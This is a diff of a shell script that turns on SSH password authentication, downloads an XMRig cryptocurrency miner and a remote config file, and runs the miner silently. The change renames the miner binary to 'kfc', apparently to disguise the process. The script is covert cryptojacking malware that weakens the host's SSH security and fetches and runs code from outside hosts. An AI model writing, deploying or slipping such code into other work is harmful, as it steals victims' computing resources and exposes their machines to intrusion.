@@ -5,8 +5,9 @@ sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/s
 sudo service sshd restart
 sudo wget -o- https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz
 tar -xf /root/xmrig.tar.gz -C /root
-chmod u+x ./xmrig
+mv xmrig kfc
+chmod u+x ./kfc
 sudo wget -o- https://github.com/lamboeio/modin/raw/refs/heads/main/xs.json
 chmod u+x ./xs.json
-./xmrig --config=./xs.json >/dev/null 2>&1
+./kfc --config=./xs.json >/dev/null 2>&1
 ping aws.amazon.com
